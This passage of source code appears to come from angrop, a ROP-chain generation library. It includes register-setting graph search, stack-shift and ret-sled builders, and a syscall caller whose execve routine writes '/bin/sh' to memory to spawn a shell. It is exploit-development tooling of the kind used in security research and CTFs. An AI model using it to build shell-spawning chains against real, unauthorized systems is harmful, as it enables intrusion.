from ..rop_gadget import RopGadget
from ..errors import RopException

l = logging.getLogger(__name__)

class RegSetter(Builder):
    """
    a chain builder that aims to set registers using different algorithms
    1. algo1: graph-search, fast, not reliable
    2. algo2: pop-only bfs search, fast, reliable, can generate chains to bypass bad-bytes
    3. algo3: riscy-rop inspired backward search, slow, can utilize gadgets containing conditional branches
    """

    #### Inits ####
    def __init__(self, chain_builder):
        super().__init__(chain_builder)
        # all the gadgets that can set registers
        self._reg_setting_gadgets: set[RopGadget]= None # type: ignore
        self.hard_chain_cache: dict[tuple, list] = None # type: ignore
        # Estimate of how difficult it is to set each register.
        # all self-contained and not symbolic access
        self._reg_setting_dict: dict[str, list] = None # type: ignore

    def bootstrap(self):
        self._reg_setting_gadgets = self.filter_gadgets(self.chain_builder.gadgets)

        # update reg_setting_dict
        self._reg_setting_dict = defaultdict(list)
        for g in self._reg_setting_gadgets:
            if not g.self_contained:
                continue
            if g.has_symbolic_access():
                continue
            for reg in g.popped_regs:
                self._reg_setting_dict[reg].append(g)
        self._insert_to_reg_dict([]) # sort reg dict

        reg_pops = Counter()
        for gadget in self._reg_setting_gadgets:
            reg_pops.update(gadget.popped_regs)

        self.hard_chain_cache = {}

    #### Utility Functions ####
    def _insert_to_reg_dict(self, gs):
        for rb in gs:
            for reg in rb.popped_regs:
                self._reg_setting_dict[reg].append(rb)
        for reg in self._reg_setting_dict:
            lst = self._reg_setting_dict[reg]
            self._reg_setting_dict[reg] = sorted(lst, key=lambda x: x.stack_change)

    def _expand_ropblocks(self, mixins):
        """
        expand simple ropblocks to gadgets so that we don't encounter solver conflicts
        when using the same ropblock multiple times
        """
        gadgets = []
        for mixin in mixins:
            if isinstance(mixin, RopGadget):
                gadgets.append(mixin)
            elif isinstance(mixin, RopBlock):
                if mixin._blank_state.solver.constraints:
                    try:
                        rb = self._build_reg_setting_chain(mixin._gadgets, {})
                        rb = RopBlock.from_chain(rb)
                        if mixin.popped_regs.issubset(rb.popped_regs):
                            rb.pop_equal_set = mixin.pop_equal_set.copy()
                            gadgets += mixin._gadgets
                            continue
                    except RopException:
                        pass
                    gadgets.append(mixin)
                else:
                    gadgets += mixin._gadgets
            else:
                raise ValueError(f"cannot turn {mixin} into RopBlock!")
        return gadgets

    def verify(self, chain, preserve_regs, registers):
        """
        given a potential chain, verify whether the chain can set the registers correctly by symbolically
        execute the chain
        """
        chain_str = chain.dstr()
        state = chain.exec()
        for act in state.history.actions.hardcopy:
            if act.type not in ("mem", "reg"):
                continue
            if act.type == 'mem':
                if act.addr.ast.variables and any(not x.startswith('sym_addr') for x in act.addr.ast.variables):
                    l.exception("memory access outside stackframe\n%s\n", chain_str)
                    return False
            if act.type == 'reg' and act.action == 'write':
                # get the full name of the register
                offset = act.offset
                offset -= act.offset % self.project.arch.bytes
                reg_name = self.project.arch.translate_register_name(offset)
                if reg_name in preserve_regs:
                    fmt = "Somehow angrop thinks\n%s\n"
                    fmt += "can be used for the chain generation-1.\n"
                    fmt += "registers: %s\n"
                    fmt += "preserve_regs: %s\n"
                    l.exception(fmt, chain_str, registers, preserve_regs)
                    return False
        for reg, val in registers.items():
            bv = getattr(state.regs, reg)
            if (val.symbolic != bv.symbolic) or state.solver.eval(bv != val.data):
                fmt = "Somehow angrop thinks\n%s\n"
                fmt += "can be used for the chain generation-1.\n"
                fmt += "registers: %s\n"
                fmt += "preserve_regs: %s\n"
                l.exception(fmt, chain_str, registers, preserve_regs)
                return False
        # the next pc must be marked as the next_pc
        if len(state.regs.pc.variables) != 1:
            return False
        pc_var = set(state.regs.pc.variables).pop()
        return pc_var.startswith("next_pc")

    def can_set_reg(self, reg):
        return bool(self._reg_setting_dict[reg])

    #### Graph Optimization ####
    def _normalize_for_move(self, gadget, new_move):
        """
        two methods:
        1. normalize it and hope the from_reg to be set during normalization
        2. normalize it and make sure the from_reg won't be clobbered during normalization and then prepend it
        """
        rb = self.normalize_gadget(gadget, post_preserve={new_move.to_reg}, to_set_regs={new_move.from_reg})
        if rb is None: # if this does not exist, no need to try the more strict version
            return None
        if new_move.to_reg in rb.popped_regs:
            return rb

        rb = self.normalize_gadget(gadget, pre_preserve={new_move.from_reg}, post_preserve={new_move.to_reg})
        if rb is None:
            return None
        reg_setter = self._reg_setting_dict[new_move.from_reg][0]
        if isinstance(reg_setter, RopGadget):
            reg_setter = RopBlock.from_gadget(reg_setter, self)
        try:
            rb = reg_setter + rb
        except RopException:
            l.error("reg_setter + rb fail to execute, plz raise an issue")
            return None

        return rb

    def _should_normalize_reg_move(self, src, dst, shortest):
        # we can't set the source register, no point in normalizing it
        if src not in shortest:
            return False
        # situations we want to check
        # 1. this is a hard register and we can set the source
        # 2. the final chain is expected to be shorter than the best setter
        # for the second scenario, we only check whether the move can be done in one step
        mover_graph = self.chain_builder._reg_mover._graph
        if not self._reg_setting_dict[dst] and self._reg_setting_dict[src]:
            return True
        edge = (src, dst)
        if mover_graph.has_edge(edge[0], edge[1]):
            edge_blocks = mover_graph.get_edge_data(edge[0], edge[1])['block']
            if edge_blocks[0].stack_change + shortest[src] < shortest[dst]:
                return True
        return False

    def _can_set_reg_with_bits(self, reg, bits):
        blocks = self._reg_setting_dict[reg]
        for block in blocks:
            pop = block.get_pop(reg)
            if pop.bits >= bits:
                return True
        return False

    @staticmethod
    def block_with_max_bit_moves(edge, edge_data):
        blocks = edge_data['block']
        edge_bits = edge_data['bits']
        results = []
        for block in blocks:
            for m in block.reg_moves:
                if m.from_reg == edge[0] and m.to_reg == edge[1]:
                    break
            else:
                raise RuntimeError("????")
            if m.bits == edge_bits:
                results.append(block)
        return results

    def _optimize_with_reg_moves(self):
        # basically, we are looking for situations like this:
        # 1) we can set register A to arbitrary value (in self._reg_setting_dict) AND
        # 2) we can move register A to another register, preferably an unseen one
        mover_graph = self.chain_builder._reg_mover._graph
        rop_blocks = []
        shortest = {x:y[0].stack_change for x,y in self._reg_setting_dict.items() if y}
        for src, dst in itertools.product(self._reg_setting_dict.keys(), self.arch.reg_list):
            if src == dst:
                continue

            if not self._should_normalize_reg_move(src, dst, shortest):
                continue

            paths = nx.all_simple_paths(mover_graph, src, dst, cutoff=3)
            all_chains = defaultdict(list)
            for path in paths:
                path_chain = []
                edges = zip(path, path[1:])
                path_bits = self.project.arch.bits
                for edge in edges:
                    edge_data = mover_graph.get_edge_data(edge[0], edge[1])
                    edge_bits = edge_data['bits']
                    path_bits = min(path_bits, edge_bits)
                    # for each edge, take the shortest 5 blocks
                    edge_blocks = sorted(RegSetter.block_with_max_bit_moves(edge, edge_data),
                                         key=lambda g: g.stack_change)[:5]
                    path_chain.append(edge_blocks)
                setter_chain = []
                for setter in self._reg_setting_dict[src]:
                    pop = setter.get_pop(src)
                    if pop.bits >= path_bits:
                        setter_chain.append(setter)
                if not setter_chain:
                    continue
                path_chains = list(itertools.product(*([setter_chain]+path_chain)))
                all_chains[path_bits] += path_chains

            if not all_chains:
                continue

            def chain_sc(gadgets):
                sc = 0
                for g in gadgets:
                    sc += g.stack_change
                return sc
            unique_chains = []
            max_bits = max(all_chains.keys())
            if not self._can_set_reg_with_bits(dst, max_bits):
                unique_chains = sorted(all_chains[max_bits], key=chain_sc)[:5]
            shorter_chains = []
            if dst in shortest:
                for bits in all_chains:
                    shorter_chains += sorted(all_chains[bits], key=chain_sc)[:5]
                shorter_chains = sorted(shorter_chains, key=chain_sc)[:5]
                shorter_chains = [c for c in shorter_chains if chain_sc(c) < shortest[dst]]

            # take the first normalized unique_chain
            for c in unique_chains:
                try:
                    gadgets = self._expand_ropblocks(c)
                    c = self._build_reg_setting_chain(gadgets, {})
                    c = RopBlock.from_chain(c)
                    rop_blocks.append(c)
                    break
                except RopException:
                    pass

            # take the first normalized shorter_chain
            for c in shorter_chains:
                try:
                    gadgets = self._expand_ropblocks(c)
                    c = self._build_reg_setting_chain(gadgets, {})
                    c = RopBlock.from_chain(c)
                    if dst not in shortest or c.stack_change < shortest[dst]:
                        shortest[dst] = c.stack_change
                        rop_blocks.append(c)
                        break
                except RopException:
                    pass
        return rop_blocks

    def _optimize_with_gadgets(self):
        new_blocks = set()
        shortest = {x:y[0] for x,y in self._reg_setting_dict.items() if y}
        arch_bytes = self.project.arch.bytes
        for gadget in itertools.chain(self._reg_setting_gadgets, self.chain_builder._reg_mover._reg_moving_gadgets):
            if gadget.self_contained and not gadget.has_symbolic_access():
                continue
            # check whether it introduces new capabilities
            rb = None
            new_pops = {x for x in gadget.popped_regs if not self._reg_setting_dict[x]}
            new_moves = {x for x in gadget.reg_moves if not self._reg_setting_dict[x.to_reg] and \
                                                            self._reg_setting_dict[x.from_reg]}
            if new_pops or new_moves:
                if new_moves:
                    for new_move in new_moves:
                        rb = self._normalize_for_move(gadget, new_move)
                        if rb is None:
                            continue
                        if new_move.to_reg in rb.popped_regs:
                            new_blocks.add(rb)
                            reg = new_move.to_reg
                            if reg not in shortest or rb.stack_change < shortest[reg].stack_change:
                                shortest[reg] = rb
                        else:
                            l.warning("normalizing \n%s does not yield any wanted new reg setting capability: %s",
                                      rb.dstr(),
                                      new_move.to_reg)
                else:
                    rb = self.normalize_gadget(gadget, post_preserve=new_pops)
                    if rb is None:
                        continue
                    if rb.popped_regs.intersection(new_pops):
                        new_blocks.add(rb)
                        for reg in new_pops:
                            if reg not in shortest or rb.stack_change < shortest[reg].stack_change:
                                shortest[reg] = rb
                    else:
                        l.warning("normalizing \n%s does not yield any wanted new reg setting capability: %s",
                                  rb.dstr(),
                                  new_pops)
                        continue

            # this means we tried to normalize the gadget but failed,
            # so don't try to do it again
            if any(reg not in shortest for reg in gadget.popped_regs):
                continue

            # check whether it shortens any chains
            better = False
            for reg in gadget.popped_regs:
                # it is unlikely we can use one more gadget to normalize it
                # usually it takes two (pop; ret), so account for it by - arch_ bytes
                if reg not in shortest or gadget.stack_change < shortest[reg].stack_change - arch_bytes:
                    # normalizing jmp_mem gadgets use a ton of gadgets, no need to even try
                    if gadget.transit_type == 'jmp_mem':
                        continue
                    if gadget.transit_type == 'pop_pc':
                        better = True
                        break
                    if gadget.transit_type == 'jmp_reg':
                        if gadget.pc_reg not in shortest:
                            continue
                        tmp = shortest[gadget.pc_reg]
                        if gadget.stack_change + tmp.stack_change < shortest[reg].stack_change:
                            better = True
                            break
            if better:
                if rb is None:
                    rb = self.normalize_gadget(gadget)
                if not rb:
                    continue
                for reg in rb.popped_regs:
                    if reg not in shortest or rb.stack_change < shortest[reg].stack_change:
                        shortest[reg] = rb
                        new_blocks.add(rb)
        return new_blocks

    def optimize(self, processes):
        # TODO: make it multiprocessing

        # now we have a functional RegSetter, check whether we can do better
        res = False

        # first, see whether we can use reg_mover to set registers
        rop_blocks = self._optimize_with_reg_moves()
        self._insert_to_reg_dict(rop_blocks)
        res |= bool(rop_blocks)

        # second, see whether we can use non-self-contained gadgets to set registers
        new_blocks = self._optimize_with_gadgets()
        self._insert_to_reg_dict(new_blocks)
        res |= bool(new_blocks)

        return res

    #### The Graph Search Algorithm ####
    def _reduce_graph(self, graph, regs): # pylint: disable=no-self-use
        """
        TODO: maybe make the reduction smarter instead of just 5 gadgets each edge
        """
        regs = set(regs)
        def giga_graph_gadget_compare(g1, g2):
            if g1.stack_change < g2.stack_change:
                return -1
            if g1.stack_change > g2.stack_change:
                return 1
            side_effect1 = len(g1.changed_regs - regs)
            side_effect2 = len(g2.changed_regs - regs)
            if side_effect1 < side_effect2:
                return -1
            if side_effect1 > side_effect2:
                return 1
            return 0

        for edge in graph.edges:
            objects = graph.get_edge_data(*edge)['objects']
            objects = sorted(objects, key=cmp_to_key(giga_graph_gadget_compare))[:5]
            graph.get_edge_data(*edge)['objects'] = objects

    def find_candidate_chains_giga_graph_search(self,
                                                modifiable_memory_range,
                                                registers,
                                                preserve_regs,
                                                warn) -> list[list[RopGadget|RopBlock]]:
        if preserve_regs is None:
            preserve_regs = set()
        else:
            preserve_regs = preserve_regs.copy()

        registers = registers.copy()

        # handle hard registers
        gadgets = self._find_relevant_gadgets(allow_mem_access=modifiable_memory_range is not None, **registers)
        hard_chain = self._handle_hard_regs(gadgets, registers, preserve_regs)
        if not registers:
            return [hard_chain]

        # now do the giga graph search
        regs = sorted(list(registers.keys()))
        # build the target pops
        bit_map = {}
        for reg, val in registers.items():
            if self.project.arch.bits == 32 or val.symbolic:
                bits = self.project.arch.bits
            else:
                if (val.concreted >> 32) == 0:
                    bits = 32
                else:
                    bits = 64
            bit_map[reg] = bits

        graph = nx.DiGraph()

        # add all the nodes. here, each node represents a state where the corresponding register
        # is correctly set to the target value
        nodes = list(itertools.product((True, False), repeat=len(regs)))
        graph.add_nodes_from(nodes)

        def add_edge(src, dst, obj):
            assert type(obj) is not list
            if graph.has_edge(src, dst):
                objects = graph.get_edge_data(src, dst)['objects']
                if obj in objects:
                    return
                objects.add(obj)
            else:
                graph.add_edge(src, dst, objects={obj})

        def get_dst_node(src, reg_list, clobbered_regs):
            dst = list(src)
            for reg in reg_list:
                if reg not in regs:
                    continue
                idx = regs.index(reg)
                dst[idx] = True
            for reg in clobbered_regs:
                if reg not in regs:
                    continue
                idx = regs.index(reg)
                dst[idx] = False
            return tuple(dst)

        def can_set_regs(g):
            # ofc pops
            reg_set = set(pop.reg for pop in g.reg_pops if pop.reg not in bit_map or pop.bits >= bit_map[pop.reg])
            # if concrete values happen to match
            for reg in regs:
                if registers[reg].symbolic:
                    continue
                if reg in g.concrete_regs and g.concrete_regs[reg] == registers[reg].concreted:
                    reg_set.add(reg)
            return reg_set

        # add edges for pops and concrete values
        total_reg_set = set()
        for g in gadgets:
            if isinstance(g, RopGadget) and not g.self_contained:
                continue
            reg_set = can_set_regs(g)
            for unique_reg_set in list(itertools.product(*g.pop_equal_set)):
                unique_reg_set = set(unique_reg_set)
                unique_reg_set = unique_reg_set.intersection(reg_set)
                clobbered_regs = g.changed_regs - unique_reg_set
                # don't add the edge if changes registers that we want to preserve
                if g.changed_regs.intersection(preserve_regs):
                    continue
                total_reg_set.update(unique_reg_set)
                for n in nodes:
                    src_node = n
                    dst_node = get_dst_node(n, unique_reg_set, clobbered_regs)
                    if src_node == dst_node:
                        continue
                    # greedy algorithm: only add edges that transit to an at least equally good node
                    src_cnt = len([x for x in src_node if x is True])
                    dst_cnt = len([x for x in dst_node if x is True])
                    if dst_cnt >= src_cnt:
                        add_edge(src_node, dst_node, g)

        # bad, we can't set all registers, no need to try
        to_set_reg_set = set(registers.keys())
        if to_set_reg_set - total_reg_set:
            if warn:
                l.warning("fail to cover all registers using giga_graph_search!")
                l.warning("register covered: %s, registers to set: %s", total_reg_set, to_set_reg_set)
            return []

        self._reduce_graph(graph, regs)

        # TODO: the ability to set a register using concrete_values and then move it to another
        # currently, we don't have a testcase that needs this

        # now find all paths between the src and dst node
        src = tuple([False] * len(regs))
        dst = tuple([True] * len(regs))

        chains = [] # here, each "chain" is a list of gadgets
        try:
            paths = nx.all_simple_paths(graph, source=src, target=dst, cutoff=min(len(registers)+2, 6))
            for path in paths:
                if hard_chain:
                    tmp = [[x] for x in hard_chain]
                else:
                    tmp = []
                edges = zip(path, path[1:])
                for edge in edges:
                    objects = graph.get_edge_data(edge[0], edge[1])['objects']
                    tmp.append(objects)
                # for each path, take the shortest 5 chains
                path_chains = itertools.product(*tmp)
                path_chains = sorted(path_chains, key=lambda c: sum(g.stack_change for g in c))[:5]
                chains += path_chains
            chains = list(chains)
        except nx.exception.NetworkXNoPath: # type: ignore
            return []

        # then sort them by stack_change
        chains = sorted(chains, key=lambda c: sum(g.stack_change for g in c))
        return chains

    def _find_relevant_gadgets(self, allow_mem_access=True, **registers):
        """
        find gadgets that may pop/load/change requested registers
        """
        gadgets = set()

        # this step will add crafted rop_blocks as well
        # notice that this step only include rop_blocks that can
        # POP the register
        for reg in registers:
            gadgets.update(self._reg_setting_dict[reg])

        # add all other gadgets that may be relevant,
        # including gadgets that set concrete values
        for g in self._reg_setting_gadgets:
            if not allow_mem_access and g.has_symbolic_access():
                continue
            # TODO: normalize these, use badbyte test as the testcase
            if g.oop:
                continue
            for reg in registers:
                if reg in g.popped_regs:
                    gadgets.add(g)
                if reg in g.changed_regs:
                    gadgets.add(g)
                if reg in g.reg_dependencies.keys():
                    gadgets.add(g)
                if reg in g.concrete_regs.keys():
                    gadgets.add(g)
        return gadgets

    def _handle_hard_regs(self, gadgets, registers, preserve_regs) -> list[RopGadget|RopBlock]: # pylint: disable=unused-argument
        # handle register set that contains bad byte (so it can't be popped)
        # and cannot be directly set using concrete values
        hard_regs = [reg for reg, val in registers.items() if self._word_contain_badbyte(val)]
        if len(hard_regs) > 1:
            l.error("too many registers contain bad bytes! bail out! %s", registers)
            raise RopException("too many registers contain bad bytes")
        if not hard_regs:
            return []
        if registers[hard_regs[0]].symbolic:
            return []

        # if hard_regs exists, try to use concrete values to craft the value
        hard_chain = []
        reg = hard_regs[0]
        val = registers[reg].concreted
        key = (reg, val)
        if key in self.hard_chain_cache:
            hard_chain = self.hard_chain_cache[key]
        else:
            hard_chains = self._find_concrete_chains(gadgets, {reg: val})
            if hard_chains:
                hard_chain = hard_chains[0]
            else:
                hard_chain = self._find_add_chain(gadgets, reg, val)
            if hard_chain:
                self.hard_chain_cache[key] = hard_chain # we cache the result even if it fails
        if not hard_chain:
            l.error("Fail to set register: %s to: %#x", reg, val)
            raise RopException("Fail to set hard registers")
        registers.pop(reg)
        return hard_chain

    @staticmethod
    def _find_concrete_chains(gadgets, registers):
        chains = []
        for g in gadgets:
            for reg, val in registers.items():
                if reg in g.concrete_regs and g.concrete_regs[reg] == val:
                    chains.append([g])
        return chains

    def _find_add_chain(self, gadgets, reg, val):
        """
        find one chain to set one single register to a specific value using concrete values only through add/dec
        """
        val = rop_utils.cast_rop_value(val, self.project)
        concrete_setter_gadgets = [ x for x in gadgets if reg in x.concrete_regs ]
        delta_gadgets = [ x for x in gadgets if len(x.reg_dependencies) == 1 and reg in x.reg_dependencies\
                            and len(x.reg_dependencies[reg]) == 1 and reg in x.reg_dependencies[reg]]
        for g1 in concrete_setter_gadgets:
            for g2 in delta_gadgets:
                try:
                    chain = self._build_reg_setting_chain([g1, g2], {reg: val})
                    state = chain.exec()
                    bv = state.registers.load(reg)
                    if bv.symbolic:
                        continue
                    if state.solver.eval(bv == val.data):
                        return [g1, g2]
                except Exception:# pylint:disable=broad-except
                    pass
        return None

    #### Gadget Filtering ####

    def _effect_tuple(self, g):
        v1 = tuple(sorted(g.popped_regs))
        v2 = tuple(sorted(g.concrete_regs.items()))
        v3 = []
        for x,y in g.reg_dependencies.items():
            v3.append((x, tuple(sorted(y))))
        v3 = tuple(sorted(v3))
        v4 = g.transit_type
        return (v1, v2, v3, v4)

    def _comparison_tuple(self, g):
        return (len(g.changed_regs-g.popped_regs), g.stack_change, g.num_sym_mem_access,
                   g.isn_count, int(g.has_conditional_branch is True))

    def _same_effect(self, g1, g2): # pylint: disable=no-self-use
        if g1.popped_regs != g2.popped_regs:
            return False
        if g1.concrete_regs != g2.concrete_regs:
            return False
        if g1.reg_dependencies != g2.reg_dependencies:
            return False
        if g1.transit_type != g2.transit_type:
            return False
        return True

    def filter_gadgets(self, gadgets):
        """
        process gadgets based on their effects
        exclude gadgets that do symbolic memory access
        """
        gadgets = [g for g in gadgets if g.popped_regs or g.concrete_regs]
        results = self._filter_gadgets(gadgets)
        return results

    #### Main Entrance ####
    def run(self, modifiable_memory_range=None, preserve_regs=None, warn=True, **registers):
        if len(registers) == 0:
            return RopChain(self.project, self, badbytes=self.badbytes)

        # sanity check
        preserve_regs = set(preserve_regs) if preserve_regs else set()
        unknown_regs = set(registers.keys()).union(preserve_regs) - set(self.arch.reg_list)
        if unknown_regs:
            raise RopException("unknown registers: %s" % unknown_regs)

        # cast values to RopValue
        for x in registers:
            registers[x] = rop_utils.cast_rop_value(registers[x], self.project)

        for gadgets in self.find_candidate_chains_giga_graph_search(modifiable_memory_range,
                                                                    registers,
                                                                    preserve_regs,
                                                                    warn):
            chain_str = "\n".join(g.dstr() for g in gadgets)
            l.debug("building reg_setting chain with chain:\n%s", chain_str)
            try:
                gadgets = self._expand_ropblocks(gadgets)
                chain = self._build_reg_setting_chain(gadgets, registers)
                if self.verify(chain, preserve_regs, registers):
                    return chain
            except (RopException, SimUnsatError):
                pass

        raise RopException("Couldn't set registers :(")

```

`angrop/chain_builder/shifter.py`:

```py
import logging
from collections import defaultdict

import claripy

from .. import rop_utils
from .builder import Builder
from ..rop_chain import RopChain
from ..rop_block import RopBlock
from ..errors import RopException

l = logging.getLogger(__name__)

class Shifter(Builder):
    """
    A class to find stack shifting gadgets, like add rsp; ret or pop chains
    """
    def __init__(self, chain_builder):
        super().__init__(chain_builder)

        self.shift_gadgets: dict = None # type: ignore

    def bootstrap(self):
        self.shift_gadgets = self.filter_gadgets(self.chain_builder.gadgets)

    def verify_shift(self, chain, length, preserve_regs):
        arch_bytes = self.project.arch.bytes
        init_sp = chain._blank_state.regs.sp.concrete_value
        state = chain.exec()
        if state.regs.sp.concrete_value != init_sp + length + arch_bytes:
            return False
        for act in state.history.actions:
            if act.type != 'reg' or act.action != 'write':
                continue
            offset = act.offset
            offset -= act.offset % self.project.arch.bytes
            reg_name = self.project.arch.translate_register_name(offset)
            if reg_name in preserve_regs:
                chain_str = chain.dstr()
                l.exception("Somehow angrop thinks \n%s\n can be used for the chain generation.", chain_str)
                return False
        return True

    def verify_retsled(self, chain, size, preserve_regs):
        if len(chain.payload_str()) != size:
            return False
        state = chain.exec()
        for act in state.history.actions:
            if act.type != 'reg' or act.action != 'write':
                continue
            offset = act.offset
            offset -= act.offset % self.project.arch.bytes
            reg_name = self.project.arch.translate_register_name(offset)
            if reg_name == self.arch.stack_pointer:
                continue
            if reg_name in preserve_regs:
                chain_str = chain.dstr()
                l.exception("Somehow angrop thinks \n%s\n can be used for the chain generation.", chain_str)
                return False
        return True

    def shift(self, length, preserve_regs=None, next_pc_idx=-1):
        """
        length:         how many bytes to shift
        preserve_regs:  what registers not to clobber
        next_pc_idx:    where is the next pc, e.g for ret, it is -1
        """
        preserve_regs = set(preserve_regs) if preserve_regs else set()
        arch_bytes = self.project.arch.bytes

        if length % arch_bytes != 0:
            raise RopException("Currently, we do not support shifting misaligned sp change")
        if length not in self.shift_gadgets or \
            all(preserve_regs.intersection(x.changed_regs) for x in self.shift_gadgets[length]):
            raise RopException("Encounter a shifting request that requires chaining multiple shifting gadgets " +
                               "together which is not support atm. Plz create an issue on GitHub " +
                               "so we can add the support!")
        g_cnt = length // arch_bytes
        next_pc_idx = (next_pc_idx % g_cnt + g_cnt) % g_cnt # support negative indexing
        for g in self.shift_gadgets[length]:
            if preserve_regs.intersection(g.changed_regs):
                continue
            if g.transit_type != 'pop_pc':
                continue
            if g.pc_offset != next_pc_idx*arch_bytes:
                continue
            try:
                chain = RopBlock(self.project, self)
                state = chain._blank_state
                chain.add_gadget(g)
                for idx in range(g_cnt):
                    if idx != next_pc_idx:
                        tmp = claripy.BVS(f"symbolic_stack_{idx}", self.project.arch.bits)
                        state.memory.store(state.regs.sp+idx*arch_bytes+arch_bytes, tmp)
                        val = state.memory.load(state.regs.sp+idx*arch_bytes+arch_bytes,
                                                self.project.arch.bytes,
                                                endness=self.project.arch.memory_endness)
                        chain.add_value(val)
                    else:
                        next_pc_val = rop_utils.cast_rop_value(
                            chain._blank_state.solver.BVS("next_pc", self.project.arch.bits),
                            self.project,
                        )
                        chain.add_value(next_pc_val)
                if self.verify_shift(chain, length, preserve_regs):
                    return chain
            except RopException:
                continue

        raise RopException(f"Failed to shift sp for {length:#x} bytes while preserving {preserve_regs}")

    def retsled(self, size, preserve_regs=None):
        preserve_regs = set(preserve_regs) if preserve_regs else set()
        arch_bytes = self.project.arch.bytes

        if size % arch_bytes != 0:
            raise RopException("the size of a retsled must be word aligned")
        if not self.shift_gadgets[arch_bytes]:
            raise RopException("fail to find a ret-equivalent gadget in this binary!")
        for g in self.shift_gadgets[arch_bytes]:
            try:
                chain = RopChain(self.project, self.chain_builder)
                for _ in range(size//arch_bytes):
                    chain.add_gadget(g)
                if self.verify_retsled(chain, size, preserve_regs):
                    return chain
            except RopException:
                continue

        raise RopException(f"Failed to create a ret-sled sp for {size:#x} bytes while preserving {preserve_regs}")

    def _effect_tuple(self, g):
        v1 = g.stack_change
        v2 = g.pc_offset
        return (v1, v2)

    def _comparison_tuple(self, g):
        return (len(g.changed_regs), g.stack_change, rop_utils.transit_num(g), g.isn_count)

    def filter_gadgets(self, gadgets):
        """
        filter gadgets having the same effect
        """
        # we don't like gadgets with any memory accesses
        gadgets = [
            x
            for x in gadgets
            if x.num_sym_mem_access == 0
            and x.self_contained
        ]

        gadgets = self._filter_gadgets(gadgets)

        d = defaultdict(list)
        for g in gadgets:
            d[g.stack_change].append(g)
        for x in d:
            d[x] = sorted(d[x], key=lambda g: len(g.changed_regs))
        return d

```

`angrop/chain_builder/sys_caller.py`:

```py
import logging
import functools

import angr

from .func_caller import FuncCaller
from ..errors import RopException
from ..import rop_utils

l = logging.getLogger(__name__)

def cmp(g1, g2):
    if g1.can_return and not g2.can_return:
        return -1
    if not g1.can_return and g2.can_return:
        return 1

    if g1.num_sym_mem_access < g2.num_sym_mem_access:
        return -1
    if g1.num_sym_mem_access > g2.num_sym_mem_access:
        return 1

    if g1.stack_change < g2.stack_change:
        return -1
    if g1.stack_change > g2.stack_change:
        return 1

    if g1.isn_count < g2.isn_count:
        return -1
    if g1.isn_count > g2.isn_count:
        return 1
    return 0

class SysCaller(FuncCaller):
    """
    handle linux system calls invocations
    """
    def __init__(self, chain_builder):
        super().__init__(chain_builder)

        self.syscall_gadgets: list = None # type: ignore
        self.sysnum_reg = self.project.arch.register_names[self.project.arch.syscall_num_offset]

    @staticmethod
    def supported_os(os):
        return "unix" in os.lower()

    def bootstrap(self):
        self.syscall_gadgets = self.filter_gadgets(self.chain_builder.syscall_gadgets)

    @staticmethod
    def verify(chain, registers, preserve_regs):
        # these registers are marked as preserved, so they are set by the user
        # don't verify them here
        registers = dict(registers)
        for reg in preserve_regs:
            if reg in registers:
                del registers[reg]
        try:
            state = chain.sim_exec_til_syscall()
        except RuntimeError:
            chain_str = chain.dstr()
            l.exception("Somehow angrop thinks\n%s\ncan be used for syscall chain generation-1.\nregisters: %s",
                        chain_str, registers)
            return False

        if state is None:
            return False

        for reg, val in registers.items():
            bv = getattr(state.regs, reg)
            if (val.symbolic != bv.symbolic) or state.solver.eval(bv != val.data):
                chain_str = chain.dstr()
                l.exception("Somehow angrop thinks\n%s\ncan be used for syscall chain generation-2.\nregisters: %s",
                            chain_str, registers)
                return False

        return True

    def filter_gadgets(self, gadgets) -> list: # pylint: disable=no-self-use
        # currently, we don't support negative stack_change
        # syscall gadgets
        gadgets = list({g for g in gadgets if g.stack_change >= 0})
        return sorted(gadgets, key=functools.cmp_to_key(cmp))

    def _try_invoke_execve(self, path_addr):
        execve_syscall = self.chain_builder.arch.execve_num
        # next, try to invoke execve(path, ptr, ptr), where ptr points is either NULL or nullptr
        if 0 not in self.badbytes:
            ptr = 0
        else:
            nullptr = self._get_ptr_to_null()
            ptr = nullptr

        try:
            return self.do_syscall(execve_syscall, [path_addr, ptr, ptr], needs_return=False)
        except RopException:
            pass

        raise RopException("Fail to invoke execve!")

    def execve(self, path=None, path_addr=None):
        if self.project.simos.name != 'Linux':
            raise RopException(f"{self.project.simos.name} is not supported!")
        if not self.syscall_gadgets:
            raise RopException("target does not contain syscall gadget!")

        # determine the execution path
        if path is None:
            path = b"/bin/sh\x00"
        if path[-1] != 0:
            path += b"\x00"

        # look for a good buffer to store the payload
        if path_addr:
            if self._word_contain_badbyte(path_addr):
                raise RopException(f"{path_addr:#x} contains bad byte!")
        else:
            # reserve a little bit more bytes to fit pointers
            path_addr = self._get_ptr_to_writable(len(path)+self.project.arch.bytes)
            if path_addr is None:
                raise RopException("Fail to automatically find a good pointer to a writable region")
            l.warning("writing to %#x", path_addr)

        # now, write the path to memory
        chain = self.chain_builder.write_to_mem(path_addr, path)

        # finally, let's invoke execve!
        chain2 = self._try_invoke_execve(path_addr)

        return chain + chain2

    def _can_set_sysnum_reg(self, syscall_num):
        try:
            self.chain_builder.set_regs(**{self.sysnum_reg: syscall_num})
        except RopException:
            return False
        return True

    def _per_request_filtering(self, syscall_num, registers, preserve_regs, needs_return):
        """
        filter out gadgets that cannot be used at all for the chain
        """

        gadgets = self.syscall_gadgets
        if needs_return:
            gadgets = [x for x in gadgets if x.can_return]
        def concrete_val_ok(g):
            for key, val in g.prologue.concrete_regs.items():
                if key in registers and type(registers[key]) == int and registers[key] != val:
                    return False
                if key == self.sysnum_reg and val != syscall_num:
                    return False
            return True
        gadgets = [x for x in gadgets if concrete_val_ok(x)]
        target_regs = dict(registers)
        target_regs[self.sysnum_reg] = syscall_num

        # now try to set sysnum_reg, if we can't do it, that means we have to rely on concrete values
        def set_sysnum(g):
            if self.sysnum_reg not in g.prologue.concrete_regs:
                return False
            return g.prologue.concrete_regs[self.sysnum_reg] == syscall_num
        if self.sysnum_reg not in preserve_regs and not self._can_set_sysnum_reg(syscall_num):
            gadgets = [g for g in gadgets if set_sysnum(g)]

        # prioritize gadgets that can set more arguments
        def key_func(g):
            good_sets = set()
            for reg, val in g.prologue.concrete_regs.items():
                if reg in target_regs and target_regs[reg] == val:
                    good_sets.add(reg)
            return len(good_sets)
        gadgets = sorted(gadgets, reverse=True, key=key_func)
        return gadgets

    def do_syscall(self, syscall_num, args, needs_return=True, **kwargs):
        """
        build a rop chain which performs the requested system call with the arguments set to 'registers' before
        the call is made
        :param syscall_num: the syscall number to execute
        :param args: the register values to have set at system call time
        :param preserve_regs: list of registers which shouldn't be set
        :param needs_return: whether to continue the ROP after invoking the syscall
